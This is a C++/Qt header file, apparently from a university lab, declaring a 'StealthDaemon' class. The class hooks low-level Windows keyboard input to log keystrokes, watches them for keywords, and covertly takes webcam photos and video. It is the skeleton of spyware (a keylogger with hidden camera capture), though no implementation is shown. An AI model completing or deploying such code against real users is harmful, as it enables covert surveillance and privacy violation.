#ifndef STEALTHDAEMON_H
#define STEALTHDAEMON_H

#include <QObject>
#include <QThread>
#include <QTimer>
#include <QStringList>
#include <QFile>
#include <QTextStream>
#include <QDateTime>
#include <QMutex>
#include <QImage>
#include <windows.h>
#include "lab4_logger.h"

class CameraWorker;

class StealthDaemon : public QObject
{
    Q_OBJECT

public:
    explicit StealthDaemon(QObject *parent = nullptr);
    ~StealthDaemon();

    // Управление демоном
    void startDaemon();
    void stopDaemon();
    bool isRunning() const { return m_isRunning; }
    
    // Настройки
    void setKeywords(const QStringList &keywords);
    void setPhotoInterval(int seconds);
    void setVideoDuration(int seconds);
    void setLoggingEnabled(bool enabled);

signals:
    void daemonStarted();
    void daemonStopped();
    void keywordDetected(const QString &keyword);
    void photoTaken(const QString &path);
    void videoRecorded(const QString &path);
    void logMessage(const QString &message);
    void errorOccurred(const QString &error);

private slots:
    void processKeyBuffer();
    void takeStealthPhoto();

private:
    // Инициализация keylogger
    bool initializeKeylogger();
    void cleanupKeylogger();
    
    // Обработка нажатий клавиш
    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
    void processKeyPress(DWORD vkCode, bool isKeyDown);
    
    // Обнаружение ключевых слов
    void checkForKeywords();
    bool containsKeyword(const QString &text);
    
    // Логирование
    void logToFile(const QString &message);
    QString getLogFilePath();
    
    // Видеонаблюдение
    void captureStealthPhoto();
    void startStealthVideo();
    void stopStealthVideo();
    QString getStealthPhotoPath();
    QString getStealthVideoPath();
    
    // Состояние
    bool m_isRunning;
    bool m_loggingEnabled;
    int m_photoInterval; // по умолчанию 5 секунд
    int m_videoDuration; // по умолчанию 4 секунды
    bool m_isRecordingVideo;
    
    // Keylogger
    HHOOK m_keyboardHook;
    QString m_keyBuffer;
    QTimer *m_bufferTimer;
    QMutex m_bufferMutex;
    
    // Ключевые слова
    QStringList m_keywords;
    
    // Логирование
    QFile *m_logFile;
    QTextStream *m_logStream;
    QMutex m_logMutex;
    
    // Камера
    CameraWorker *m_cameraWorker;
    
    // Таймер для периодических видео
    QTimer *m_videoTimer;
    
    // Статические переменные для callback
    static StealthDaemon *s_instance;
    static QMutex s_instanceMutex;
};

// Отдельный поток для демона
class StealthDaemonThread : public QThread
{
    Q_OBJECT

public:
    explicit StealthDaemonThread(QObject *parent = nullptr);
    ~StealthDaemonThread();
    
    StealthDaemon* getDaemon() const { return m_daemon; }

    // Конфигурация демона (применяется при запуске потока)
    void setKeywords(const QStringList &keywords) { m_keywords = keywords; }
    void setPhotoInterval(int seconds) { m_photoInterval = seconds; }
    void setVideoDuration(int seconds) { m_videoDuration = seconds; }
    void setLoggingEnabled(bool enabled) { m_loggingEnabled = enabled; }

protected:
    void run() override;

private:
    StealthDaemon *m_daemon;
    // Параметры конфигурации, применяются в run() после создания демона
    QStringList m_keywords;
    int m_photoInterval = 30;
    int m_videoDuration = 10;
    bool m_loggingEnabled = true;
};

#endif // STEALTHDAEMON_H
